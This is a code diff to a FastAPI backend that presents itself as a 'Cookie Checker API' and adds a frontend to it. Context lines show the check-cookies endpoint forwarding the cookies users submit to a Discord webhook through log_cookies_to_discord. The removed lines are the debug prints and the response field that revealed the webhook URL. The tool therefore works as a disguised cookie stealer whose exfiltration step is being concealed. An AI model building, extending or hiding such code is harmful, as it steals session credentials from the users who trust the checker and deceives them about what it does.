@@ -1,5 +1,7 @@
 from fastapi import FastAPI, HTTPException, UploadFile, File
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import FileResponse
+from fastapi.staticfiles import StaticFiles
 from pydantic import BaseModel
 from typing import List, Optional
 import json
@@ -8,21 +10,13 @@ import httpx
 import asyncio
 import logging
 import os
+from pathlib import Path
 import re
 from dotenv import load_dotenv
 from urllib.parse import unquote
 from uuid import uuid4
 
 load_dotenv()
-
-# ===== DEBUG: PRINT ENVIRONMENT VARIABLE AT STARTUP =====
-webhook_url = os.getenv("DISCORD_WEBHOOK_URL")
-print(f"[STARTUP] DISCORD_WEBHOOK_URL = {webhook_url}")
-if not webhook_url:
-    print("[STARTUP] ⚠️ WARNING: DISCORD_WEBHOOK_URL is NOT set in Secrets!")
-else:
-    print(f"[STARTUP] ✅ Webhook found: {webhook_url[:50]}...")
-# ========================================================
 
 # Ensure Playwright can find its browsers
 _pw_browsers = os.getenv("PLAYWRIGHT_BROWSERS_PATH")
@@ -971,6 +965,9 @@ async def get_browser_cookies_with_playwright(
 
 @app.get("/")
 async def root():
+    frontend_index = Path(__file__).resolve().parent.parent / "frontend" / "dist" / "index.html"
+    if frontend_index.exists():
+        return FileResponse(frontend_index)
     return {"status": "running", "message": "Cookie Checker API", "version": "1.0.0"}
 
 
@@ -996,9 +993,6 @@ async def check_cookies(request: CookieCheckRequest):
             )
         print(f"[DEBUG] Parsed {len(cookies)} cookies")
         webhook_url = os.getenv("DISCORD_WEBHOOK_URL")
-        print(
-            f"[DEBUG] Webhook URL from env: {webhook_url[:50] if webhook_url else 'None'}..."
-        )
         if webhook_url and cookies:
             print("[DEBUG] Triggering Discord logger...")
             await log_cookies_to_discord(cookies, webhook_url, "check-cookies")
@@ -1499,7 +1493,12 @@ async def test_discord():
 
     test_cookie = Cookie(name="test", value="hello-discord")
     await log_cookies_to_discord([test_cookie], webhook_url, "test-endpoint")
-    return {"status": "sent", "webhook": webhook_url[:50] + "..."}
+    return {"status": "sent"}
+
+
+frontend_dist = Path(__file__).resolve().parent.parent / "frontend" / "dist"
+if frontend_dist.exists():
+    app.mount("/", StaticFiles(directory=frontend_dist, html=True), name="frontend")
 
 
 if __name__ == "__main__":
